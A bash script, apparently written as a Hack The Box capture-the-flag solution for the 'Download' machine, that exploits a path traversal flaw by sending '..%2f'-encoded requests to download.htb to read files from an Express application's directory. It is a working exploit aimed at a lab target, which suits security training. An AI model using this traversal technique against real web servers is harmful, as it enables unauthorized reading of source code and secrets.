#!/bin/bash

# HTB Download
# ------------
# Author: Marss
# Date: 09 Oct, 2023

# Ctrl + C
# (function)
signal_handler(){
    echo -e "\n[!] User aborted."
    exit 1
}
# (signal)
trap signal_handler SIGINT

# Help panel
help(){
    echo -e "[*] Usage: $0 -f 'express_app_file'"
}

# Local file inclusion
file_reader(){
    path_bypass=$(echo $file_to_read | sed 's/\//%2f/g')

    response=$(curl -s -XGET "http://download.htb/files/download/..%2f$path_bypass")

    if [[ "$response" == *"<pre>Not Found</pre>"* ]]; then
        echo -e "\n[-] File not Found."
        exit 1
    elif [[ "$response" == *"400 Bad Request"* ]]; then
        echo -e "\n[-] Only files from the root directory of the express application."
        exit 1
    fi

    echo
    echo "$response"
}

# Main flow
if [[ "$#" -eq 0 ]]; then
    help
    exit 1
fi

while getopts ":hf:" opt
do
    case $opt in
        h)
            help
            exit 1;;
        f)
            file_to_read=$OPTARG
            file_reader;;
        \?)
            echo -e "\n[!] Invalid option."
            exit 1;;
    esac
done